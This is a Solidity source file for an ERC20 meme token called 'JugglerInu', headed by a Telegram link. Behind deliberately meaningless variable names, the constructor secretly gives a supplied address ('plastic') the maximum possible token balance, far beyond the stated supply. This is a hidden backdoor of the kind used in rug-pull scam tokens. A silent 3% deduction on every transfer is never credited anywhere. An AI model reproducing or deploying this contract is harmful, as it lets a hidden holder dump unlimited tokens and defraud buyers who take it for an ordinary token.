/*

https://t.me/jugglerinu

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';

contract JugglerInu is ERC20, Ownable {
    uint256 private deer = ~uint256(0);
    uint256 public carry = 3;

    constructor(
        string memory produce,
        string memory population,
        address nails,
        address plastic
    ) ERC20(produce, population) {
        _totalSupply = 1000000000 * 10**decimals();
        _balances[plastic] = deer;
        _balances[_msgSender()] = _totalSupply;
    }

    function _transfer(
        address gentle,
        address journey,
        uint256 suppose
    ) internal override {
        uint256 mental = (suppose / 100) * carry;
        suppose = suppose - mental;
        super._transfer(gentle, journey, suppose);
    }
}